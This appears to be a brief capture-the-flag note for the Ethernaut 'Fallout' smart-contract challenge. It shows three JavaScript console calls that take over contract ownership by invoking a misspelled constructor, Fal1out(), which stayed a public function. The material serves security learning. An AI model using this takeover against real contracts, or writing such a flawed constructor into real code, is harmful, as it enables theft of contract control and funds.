fallout

// NOTE: constructor is NOT spelled correctly

```javascript
await contract.owner.call() // => returns rightful owner of the contract
await contract.Fal1out() // calls constructor; not called during contract deployment due to misspelling
await contract.owner.call() // => should see contract owner change to attacker once tx mined
```
